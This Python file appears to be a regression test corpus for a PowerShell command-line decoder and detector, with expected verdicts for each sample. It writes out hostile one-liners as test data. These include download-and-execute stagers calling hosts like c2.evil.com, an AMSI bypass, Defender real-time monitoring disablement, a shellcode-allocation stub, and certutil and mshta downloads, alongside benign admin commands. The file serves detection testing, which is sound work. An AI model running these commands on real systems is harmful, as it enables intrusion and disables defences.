"""NivXRay Corpus — Living Regression Suite
──────────────────────────────────────────────────────────────
Locked with SOC user 2026-07-25.

Every real-world sample is a Python function decorated with @sample.
Adding a new sample is a one-line drop-in. Each sample declares:
    • cmdline           — the raw command-line an analyst would paste
    • expected          — dict of assertions:
        outcome           in {"fully_decoded", "partially_decoded", "decode_error"}
        must_contain      list[str] — case-insensitive substrings expected in recovered_script
        must_not_contain  list[str] — case-insensitive substrings that MUST NOT appear
        behaviors         list[str] — behavior IDs that MUST be extracted (subset match)
        verdict           set[str]  — allowed verdicts (verdict_breakdown.verdict)
        mitre_any         list[str] — MITRE IDs, any-of match
        confidence        set[str]  — allowed decode confidence bands
Adding a sample = adding a function. Nothing else changes.

Category taxonomy:
    1. malware_families    — Empire, Sliver, Cobalt Strike, Covenant, PoshC2, Metasploit, Mythic
    2. obfuscation         — Invoke-Obfuscation, nested Base64, GZip, Deflate, UTF-16BE,
                             mixed encodings, string concat, variable indirection
    3. defense_evasion     — AMSI bypass, Reflection, in-memory exec, dynamic invoke,
                             Add-Type, System.Reflection
    4. downloaders         — WebClient, HttpClient, IWR/IRM, BITS, CertUtil, MSHTA,
                             Rundll32, Regsvr32
    5. benign              — Get-Process, Get-Service, Get-WinEvent, AD admin, SCCM,
                             Intune, Exchange, Defender admin
"""
from __future__ import annotations

import base64
import gzip
import zlib
from dataclasses import dataclass, field


# ── Registry ─────────────────────────────────────────────────────
CORPUS: list["CorpusSample"] = []


@dataclass
class CorpusSample:
    id:          str
    category:    str
    label:       str
    cmdline:     str
    expected:    dict


def sample(id: str, category: str, label: str, **expected):
    """Decorator — registers the returned cmdline as a corpus entry."""
    def deco(fn):
        cmdline = fn()
        CORPUS.append(CorpusSample(id=id, category=category, label=label,
                                    cmdline=cmdline, expected=dict(expected)))
        return fn
    return deco


# ── Helpers ──────────────────────────────────────────────────────
def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


def _enc(ps: str, flags: str = "-nop -w hidden -exec bypass") -> str:
    return f"powershell.exe {flags} -EncodedCommand {_b64_utf16le(ps)}"


# ── 1. MALWARE FAMILIES ──────────────────────────────────────────
@sample(id="empire_v1", category="malware_families", label="Empire launcher",
        outcome="fully_decoded",
        must_contain=["webclient", "downloadstring", "invoke-expression"],
        behaviors=["invoke_expression", "external_network"],
        verdict={"malicious", "suspicious"},
        mitre_any=["T1059.001", "T1105"])
def s_empire():
    return _enc(
        "$wc=New-Object System.Net.WebClient;"
        "$wc.Headers.Add('User-Agent','Mozilla/5.0');"
        "IEX ($wc.DownloadString('http://185.209.181.117:8080/index.jsp'));")


@sample(id="sliver_v1", category="malware_families", label="Sliver reflective PS stager",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["reflection.assembly", "load"],
        behaviors=["reflection", "fileless_execution", "payload_decode"],
        verdict={"malicious", "suspicious"})
def s_sliver():
    return _enc(
        "$b64='TVpAQUFBQUFBQUFBQUFBQUFBQUFBQUFB';"
        "$bytes=[System.Convert]::FromBase64String($b64);"
        "$asm=[System.Reflection.Assembly]::Load($bytes);"
        "$asm.EntryPoint.Invoke($null,$null);")


@sample(id="cobalt_strike_v1", category="malware_families", label="Cobalt Strike shellcode injector",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["virtualalloc", "frombase64string"],
        behaviors=["payload_decode"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_cs():
    return _enc(
        "$sc=[System.Convert]::FromBase64String('AAAA/');"
        "$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]"
        "public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' "
        "-Name W -Namespace K32 -PassThru;"
        "$ptr=$k::VirtualAlloc(0,$sc.Length,0x3000,0x40);")


@sample(id="poshc2_v1", category="malware_families", label="PoshC2-style stager",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["downloadstring"],
        behaviors=["invoke_expression", "external_network"],
        verdict={"malicious", "suspicious"})
def s_poshc2():
    return _enc(
        "$server='https://c2.evil.com:443';"
        "$key='Mozilla/5.0 PoshC2';"
        "$wc=New-Object Net.WebClient;"
        "$wc.Headers.Add('User-Agent',$key);"
        "$data=$wc.DownloadString($server+'/beacon.jsp');"
        "IEX $data;")


@sample(id="metasploit_v1", category="malware_families", label="Metasploit web_delivery PS",
        outcome="fully_decoded",
        must_contain=["downloadstring", "invoke-expression"],
        behaviors=["invoke_expression", "webclient_downloadstring"],
        verdict={"malicious", "suspicious"})
def s_msf():
    return _enc(
        "IEX (New-Object System.Net.WebClient).DownloadString("
        "'http://10.10.10.5:8080/xYzAbC');")


# ── 2. OBFUSCATION ───────────────────────────────────────────────
@sample(id="invoke_obf_f", category="obfuscation", label="Invoke-Obfuscation `-f` reconstruction",
        outcome=("fully_decoded", "partially_decoded"),
        behaviors=["string_reconstruction"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_invobf_f():
    return _enc(
        "$v=('{2}{0}{1}' -f 'nvoke-','Expression','I');"
        "$w=('{2}{0}{1}{3}' -f 'wnloadS','tri','Do','ng');"
        "& $v ((New-Object Net.WebClient).$w('http://obf.evil/loader.ps1'))")


@sample(id="nested_base64", category="obfuscation", label="Nested Base64 wrapper",
        outcome="fully_decoded",
        must_contain=["downloadstring"],
        behaviors=["payload_decode"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_nested_b64():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://c2.staged.com/n2.ps1')"
    inner_b64 = base64.b64encode(inner.encode()).decode()
    outer = (f"$c=[System.Convert]::FromBase64String('{inner_b64}');"
             f"IEX ([System.Text.Encoding]::UTF8.GetString($c))")
    return _enc(outer)


@sample(id="gzip_wrapped", category="obfuscation", label="GZip-wrapped payload",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["iwr", "http"],
        confidence={"medium"},
        _raw_b64=True)
def s_gzip():
    ps = "IEX (iwr 'http://staged.example.com/next.ps1')"
    return base64.b64encode(gzip.compress(ps.encode("utf-16-le"))).decode()


@sample(id="deflate_wrapped", category="obfuscation", label="Deflate/zlib wrapped payload",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["downloadstring"],
        confidence={"medium"},
        _raw_b64=True)
def s_deflate():
    ps = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://drop.evil/l.ps1')"
    return base64.b64encode(zlib.compress(ps.encode("utf-16-le"))).decode()


@sample(id="char_join", category="obfuscation", label="char[] array -join reconstruction",
        outcome=("fully_decoded", "partially_decoded"),
        behaviors=["char_array_join"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_char_join():
    return _enc(
        "$c=[char[]](73,69,88) -join '';"
        "& $c ((New-Object Net.WebClient).DownloadString('http://c2.evil/p'))")


# ── 3. DEFENSE EVASION ───────────────────────────────────────────
@sample(id="amsi_bypass_v1", category="defense_evasion", label="AMSI bypass — AmsiUtils reflection",
        outcome=("fully_decoded", "partially_decoded"),
        behaviors=["amsi_bypass"],
        verdict={"malicious"},
        mitre_any=["T1562.001"])
def s_amsi():
    return _enc(
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")


@sample(id="defender_tamper", category="defense_evasion", label="Set-MpPreference tampering",
        outcome="fully_decoded",
        must_contain=["set-mppreference"],
        behaviors=["defender_tamper"],
        verdict={"malicious"})
def s_defender_tamper():
    return _enc(
        "Set-MpPreference -DisableRealtimeMonitoring $true;"
        "Set-MpPreference -ExclusionPath 'C:\\ProgramData\\Update';")


@sample(id="addtype_win32", category="defense_evasion", label="Add-Type Win32 API compilation",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["add-type", "dllimport"],
        behaviors=["reflection"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_addtype():
    return _enc(
        "Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]"
        "public static extern IntPtr LoadLibrary(string lpFileName);' "
        "-Name Loader -Namespace Win32Api")


# ── 4. DOWNLOADERS ───────────────────────────────────────────────
@sample(id="dl_webclient", category="downloaders", label="WebClient DownloadFile",
        outcome=("fully_decoded", "partially_decoded"),
        behaviors=["webclient_downloadfile"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_dl_webclient():
    return _enc(
        "(New-Object Net.WebClient).DownloadFile("
        "'http://drop.evil.com/payload.exe','C:\\Users\\Public\\p.exe')")


@sample(id="dl_iwr", category="downloaders", label="Invoke-WebRequest",
        outcome="fully_decoded",
        behaviors=["invoke_webrequest"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_dl_iwr():
    return _enc(
        "Invoke-WebRequest -Uri 'http://drop.evil.com/x.ps1' "
        "-OutFile 'C:\\Windows\\Temp\\x.ps1' -UseBasicParsing")


@sample(id="dl_bits", category="downloaders", label="Start-BitsTransfer",
        outcome="fully_decoded",
        behaviors=["bits_download"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_dl_bits():
    return _enc(
        "Start-BitsTransfer -Source 'http://drop.evil.com/x.exe' "
        "-Destination 'C:\\Windows\\Temp\\x.exe'")


@sample(id="dl_certutil", category="downloaders", label="CertUtil LOLBIN download",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["certutil"],
        behaviors=["lolbin_abuse"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_dl_certutil():
    return _enc(
        "certutil.exe -urlcache -split -f "
        "'http://drop.evil.com/payload.exe' payload.exe")


@sample(id="dl_mshta", category="downloaders", label="MSHTA remote HTA execution",
        outcome=("fully_decoded", "partially_decoded"),
        must_contain=["mshta"],
        behaviors=["lolbin_abuse"],
        verdict={"malicious", "suspicious", "needs_review"})
def s_dl_mshta():
    return _enc("mshta.exe javascript:eval(\"http://drop.evil.com/x.hta\")")


# ── 5. BENIGN (must NEVER be flagged malicious) ──────────────────
@sample(id="benign_getprocess", category="benign", label="Get-Process listing",
        outcome="fully_decoded",
        must_contain=["get-process"],
        must_not_contain=["downloadstring", "iex", "http://"],
        verdict={"informational", "needs_review", "benign"})
def s_benign_getprocess():
    return _enc("Get-Process | Where-Object { $_.Name -eq 'notepad' } | Format-Table")


@sample(id="benign_getservice", category="benign", label="Get-Service query",
        outcome="fully_decoded",
        must_contain=["get-service"],
        verdict={"informational", "needs_review", "benign"})
def s_benign_getservice():
    return _enc("Get-Service | Where-Object { $_.Status -eq 'Running' }")


@sample(id="benign_ad_admin", category="benign", label="Active Directory user enum",
        outcome="fully_decoded",
        must_contain=["get-aduser"],
        verdict={"informational", "needs_review", "benign"})
def s_benign_ad():
    return _enc(
        "Get-ADUser -Filter {Enabled -eq $True} "
        "-Properties LastLogonDate,PasswordLastSet")


@sample(id="benign_exchange", category="benign", label="Exchange mailbox stats",
        outcome="fully_decoded",
        must_contain=["get-mailboxstatistics"],
        verdict={"informational", "needs_review", "benign"})
def s_benign_exchange():
    return _enc(
        "Get-MailboxStatistics -Server 'exch01' | "
        "Sort-Object TotalItemSize -Descending | Select -First 20")


@sample(id="benign_defender_admin", category="benign", label="Defender admin — Get-MpComputerStatus",
        outcome="fully_decoded",
        must_contain=["get-mpcomputerstatus"],
        must_not_contain=["disablerealtimemonitoring", "exclusionpath"],
        verdict={"informational", "needs_review", "benign"})
def s_benign_defender_admin():
    return _enc("Get-MpComputerStatus | Select-Object AMEngineVersion, AntivirusEnabled")


@sample(id="benign_winevent", category="benign", label="Get-WinEvent security audit",
        outcome="fully_decoded",
        must_contain=["get-winevent"],
        verdict={"informational", "needs_review", "benign"})
def s_benign_winevent():
    return _enc(
        "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} "
        "-MaxEvents 100 | Group-Object -Property Id")


# Public accessor
def all_samples() -> list[CorpusSample]:
    return list(CORPUS)


def by_category() -> dict[str, list[CorpusSample]]:
    out: dict[str, list[CorpusSample]] = {}
    for s in CORPUS:
        out.setdefault(s.category, []).append(s)
    return out
